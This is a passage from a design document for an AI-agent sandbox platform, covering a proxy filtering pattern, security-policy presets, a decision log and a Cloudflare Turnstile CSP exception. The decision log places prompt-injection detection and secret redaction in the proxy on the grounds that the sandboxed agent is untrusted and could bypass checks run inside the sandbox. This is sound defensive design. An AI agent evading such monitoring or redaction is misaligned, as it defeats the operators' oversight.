- Loads Sandbox CRD via `c.Get("sandbox")` (cached by ownership middleware)
- Reads `sandbox.Status.PodIP` for forwarding
- Has `stripPatchParts()` for response filtering (existing pattern for post-processing responses)

Proxy-layer redaction and injection detection follow the same pattern as `stripPatchParts()`:
- Read response body from opencode
- Apply transformation (redaction/injection scan)
- Write modified body to client
- Only on JSON responses, only on 2xx status codes

---

## Appendix B: Comparison with V2 Binary Model

| Aspect | V2 (binary) | V2.1 (composable) |
|--------|-------------|-------------------|
| Configuration | `securityLevel: standard \| high` | `securityPolicy: {preset, features...}` |
| Granularity | All-or-nothing | Per-feature toggle |
| Adoption path | Cliff (standard → high) | Gradual (enable one feature at a time) |
| Customization | None | Custom patterns, domain lists, action modes |
| Platform control | None | `enforceMinimum` in Helm values |
| Observability | None | Per-feature metrics, dashboards, alerts |
| Backwards compat | N/A | `securityLevel` maps to presets |

## Appendix C: Decision Log

| Decision | Rationale | Alternatives Considered |
|----------|-----------|------------------------|
| Three presets (standard/hardened/paranoid) | Two is too few (no middle ground); four+ is confusing | Two (standard/high), four (add "moderate"), fully custom only |
| Presets allow overrides | Users want a starting point they can customize | Presets are immutable (rejected: too rigid) |
| Injection detection in proxy, not in sandbox | Proxy is the trust boundary; sandbox is untrusted | In-sandbox detection (rejected: agent could bypass) |
| Network policy per-sandbox, not per-workspace | Different sandboxes may need different egress | Per-workspace only (rejected: too coarse for override use case) |
| Admission enforcement is warn-not-reject when Kyverno missing | Workspace owner may not control cluster addons | Hard reject (rejected: blocks adoption on clusters without Kyverno) |
| `enforceMinimum` at platform level | Operators need a security floor users can't disable | Per-namespace policies (rejected: more complex, same effect) |
| Additive domain merging for sandbox overrides | Sandboxes should only expand access, not restrict workspace policy | Full replacement (rejected: sandbox could accidentally lock itself out of LLM APIs) |
| Dual-layer redaction (proxy + entrypoint) | Proxy catches all secrets in responses (primary); entrypoint catches opencode log output (secondary) | Sandbox-only redaction (rejected: doesn't catch tool output that flows through opencode internally); Proxy-only (rejected: misses opencode's own log output) |
| ConfigMap for policy delivery (not shell interpolation) | JSON with regex patterns contains special characters that break shell quoting | Env var injection (rejected: same quoting issue); Projected Secret volume (rejected: policy is not secret data) |
| No `jq` in standard image | Minimizes attack surface and image size; entrypoint uses `grep` for simple boolean check | Install jq everywhere (rejected: unnecessary dependency for standard mode) |
| All array merge semantics are "replace" | Predictable behavior; no special-case logic per field | Per-field additive/replace rules (rejected: maintenance hazard, confusing for users) |
| Removed `audit.events` array | `logLevel` tiers are sufficient; per-event config adds surface without value and risks users disabling critical events | Keep events array (rejected: over-engineered) |
| Go regexp (RE2) eliminates ReDoS risk | Go's Thompson NFA guarantees linear-time matching | Add runtime timeouts (unnecessary for Go; kept complexity limits for performance) |

## Appendix D: Third-party CDN CSP exceptions

The frontend and API layer ship a default Content-Security-Policy of
`default-src 'self'` (plus a handful of specific-directive tightenings —
see `charts/llmsafespaces/values.yaml` ingress annotation and
`api/internal/middleware/security.go` `DefaultSecurityConfig.ContentSecurityPolicy`).

Certain optional features require cross-origin resource loading and thus
CSP relaxation. This appendix records those exceptions so operators can
audit the security posture at a glance and future features have a
template for how to document their own CSP requirements.

### D.1 Cloudflare Turnstile CAPTCHA (feature gate: `turnstile.enabled`)

When enabled, the frontend loads the Turnstile widget script from
`https://challenges.cloudflare.com/turnstile/v0/api.js` and renders the
challenge in an iframe served from the same origin. Both operations are
blocked by the default CSP.

**Scope of relaxation** (only when `turnstile.enabled=true`):
- `script-src` gains `https://challenges.cloudflare.com`
- `frame-src` is synthesized (if absent) or extended (if present) to
  include `https://challenges.cloudflare.com`

Applied surfaces:
- Chart: `templates/frontend-ingress.yaml` uses `regexReplaceAll` on the
  `nginx.ingress.kubernetes.io/configuration-snippet` annotation.
- API: `api/internal/app/app.go` `addTurnstileToCSP()` transforms
  `securityCfg.ContentSecurityPolicy` at server startup.

Both surfaces have dedicated tests
(`charts/llmsafespaces/chart_test.go`, `api/internal/app/csp_turnstile_test.go`)
that verify the transform's correctness AND that the default policy is
unchanged when the feature is disabled — no accidental broadening for
deployments that don't use Turnstile.

**Risk assessment**: `challenges.cloudflare.com` is a Cloudflare-controlled
CDN endpoint serving a documented public JavaScript API. Compromise of
that endpoint would compromise Turnstile globally, not just this
deployment; the incremental risk to this specific application is bounded
by the same set of attackers who could compromise the Cloudflare edge
that already serves 100% of the app's traffic. `unsafe-inline` and
`unsafe-eval` are NOT relaxed — the Turnstile widget uses postMessage +
iframe isolation, not inline evaluation.

**When to remove**: if Turnstile is replaced with a self-hosted CAPTCHA
(unlikely) or the feature is retired.
